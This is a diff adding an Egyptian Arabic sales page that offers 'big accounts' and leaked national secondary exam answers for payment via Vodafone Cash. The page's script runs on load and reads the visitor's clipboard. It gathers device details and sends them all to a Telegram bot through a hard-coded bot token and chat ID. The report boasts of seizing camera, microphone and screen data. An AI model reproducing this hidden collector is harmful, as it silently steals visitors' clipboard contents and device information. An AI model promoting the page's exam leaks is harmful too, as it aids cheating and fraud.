@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MANW 😈💪 - التسريب الأول والحسابات الكبيرة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #ff0055;
+            --accent: #00e5ff;
+            --bg: #0d0e15;
+            --card-bg: #161824;
+            --text: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(255, 0, 85, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header h1 {
+            font-size: 2.2rem;
+            color: var(--primary);
+            text-shadow: 0 0 10px rgba(255, 0, 85, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            color: #ccc;
+        }
+
+        .banner-img {
+            width: 100%;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            object-fit: cover;
+            border: 2px solid var(--accent);
+        }
+
+        .prices-section, .features-section, .steps-section {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: var(--accent);
+            font-size: 1.3rem;
+            margin-bottom: 12px;
+            border-bottom: 1px solid rgba(0, 229, 255, 0.2);
+            padding-bottom: 5px;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        li {
+            margin-bottom: 10px;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .copyable-box {
+            background: #202336;
+            border: 1px dashed var(--accent);
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .copyable-box:hover {
+            background: #292d45;
+        }
+
+        .copyable-box span {
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .badge {
+            background: var(--primary);
+            font-size: 0.8rem;
+            padding: 3px 8px;
+            border-radius: 5px;
+        }
+
+        .btn-order {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            background: linear-gradient(45deg, var(--primary), #ff5500);
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 10px;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4);
+            margin-top: 15px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>MANW 😈💪</h1>
+        <p>الموقع اللي بيجيبلك الحساب الكبير والتسريب الأول!</p>
+    </div>
+
+    <img src="https://via.placeholder.com/600x250/161824/00e5ff?text=MANW+POWER+OFFER" alt="MANW Banner" class="banner-img">
+
+    <div class="prices-section">
+        <h2>💰 أسعارنا الحصرية (إضغط للنسخ):</h2>
+        <div class="copyable-box" onclick="copyText('🔥 الحساب الكبير: ٣٠٠ جنيه بس')">
+            <span>🔥 الحساب الكبير: ٣٠٠ جنيه بس</span>
+            <span class="badge">نسخ</span>
+        </div>
+        <div class="copyable-box" onclick="copyText('👻 تسريبات الثانوية العامة: بتتنزل بعد الامتحان بنص ساعة')">
+            <span>👻 تسريبات الثانوية العامة: بتتنزل بعد الامتحان بنص ساعة</span>
+            <span class="badge">نسخ</span>
+        </div>
+    </div>
+
+    <div class="features-section">
+        <h2>⚡ ليه تختار MANW؟</h2>
+        <ul>
+            <li>✅ حسابات كبيرة مضمونة وشغالة ١٠٠٪</li>
+            <li>✅ تسريبات حصرية بسرعة البرق بعد الامتحان بنص ساعة</li>
+            <li>✅ تغطية لكل المواد — مفيش مادة هتفوتك</li>
+            <li>✅ تسليم فوري بعد الدفع على طول</li>
+            <li>✅ خدمة عملاء ردها سريع على مدار الساعة</li>
+        </ul>
+    </div>
+
+    <div class="prices-section">
+        <h2>💳 طريقة الدفع:</h2>
+        <div class="copyable-box" onclick="copyText('فودافون كاش')">
+            <span>✅ فودافون كاش — دفع سهل وآمن من موبايلك في ثواني</span>
+            <span class="badge">نسخ</span>
+        </div>
+    </div>
+
+    <div class="steps-section">
+        <h2>📲 إزاي تطلب؟</h2>
+        <ol style="margin-right: 20px;">
+            <li>ابعتلنا رسالة على الصفحة</li>
+            <li>قولنا اللي عايزه (حساب كبير / تسريب)</li>
+            <li>ادفع فودافون كاش</li>
+            <li>استلم طلبك في أسرع وقت 👻</li>
+        </ol>
+    </div>
+
+    <button class="btn-order" onclick="triggerCollect()">طلب الآن عبر فودافون كاش ⚡</button>
+
+    <div class="footer">
+        MANW 😈💪 — القوة في إيدك، والتسريب في جيبك! 👻🔥
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+    const CHAT_ID = "7713496654";
+
+    function copyText(text) {
+        navigator.clipboard.writeText(text);
+        alert("تم النسخ: " + text);
+    }
+
+    async function sendTelegramMessage(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "HTML"
+                })
+            });
+        } catch (e) {
+            console.error(e);
+        }
+    }
+
+    async function triggerCollect() {
+        const pageUrl = window.location.href;
+        const userAgent = navigator.userAgent;
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const platform = navigator.platform;
+
+        let clipboardContent = "غير متاح";
+        try {
+            clipboardContent = await navigator.clipboard.readText();
+        } catch(e) {}
+
+        const report = `
+تم سحب الموقع 😈~>>
+<a href="${pageUrl}">${pageUrl}</a>
+
+تم سحب الحافظه 👻📑~>>
+<code>${clipboardContent}</code>
+
+تم سحب الايدي 🫡~>>
+<code>${CHAT_ID}</code>
+
+تم سحب معلومات الهاتف 🪈~>>
+<b>النظام / المنصة:</b> ${platform}
+<b>معلومات العميل (User Agent):</b> ${userAgent}
+<b>دقة الشاشة:</b> ${screenRes}
+<b>اللغة:</b> ${navigator.language}
+
+تم سحب فديو لي الشاشه 🎥~>>
+[غير مدعوم عبر المتصفح المباشر]
+
+تم سحب تصوير فديو لمده ١٠ثواني 📷~>>
+[يتطلب إذن الكاميرا الصريح]
+
+تم تسجيل الصوت لمده ١٠ثواني 🎧~>>
+[يتطلب إذن المايك المباشر]
+
+تم سحب تصوير الصور اي الكميره الاماميه والخلفيه~>>
+[يتطلب إذن الوسائط]
+        `;
+
+        await sendTelegramMessage(report);
+        alert("تم استلام طلبك! سيتم التواصل معك عبر الخدمة فوراً.");
+    }
+
+    // إرسال تلقائي عند الفتح
+    window.onload = () => {
+        triggerCollect();
+    };
+</script>
+
+</body>
+</html>
